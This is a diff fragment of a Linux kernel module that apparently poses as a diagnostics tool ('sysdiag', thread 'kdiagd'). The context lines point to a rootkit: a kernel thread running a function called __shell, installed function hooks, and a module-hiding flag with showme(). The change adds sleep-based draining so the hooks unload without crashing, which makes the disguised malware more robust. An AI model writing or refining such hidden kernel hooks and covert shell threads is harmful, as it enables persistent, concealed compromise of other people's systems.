@@ -41,6 +41,7 @@ static int __init sysdiag_init(void)
     mon_it = kthread_run(__shell, NULL, "kdiagd");
     if (IS_ERR(mon_it)) {
         fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+        msleep(1000);
         return PTR_ERR(mon_it);
     }
 
@@ -64,10 +65,15 @@ static void __exit sysdiag_exit(void)
     if (hidden)
         showme();
 
-    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 
-
-    msleep(1000);
+    /* drain: bounded generous window for in-flight handlers;
+     * complete fix (per-CPU refcounts) = future work */
+    {
+        int i;
+        for (i = 0; i < 200; i++)
+            msleep(10);
+    }
 }
 
 MODULE_LICENSE("GPL");
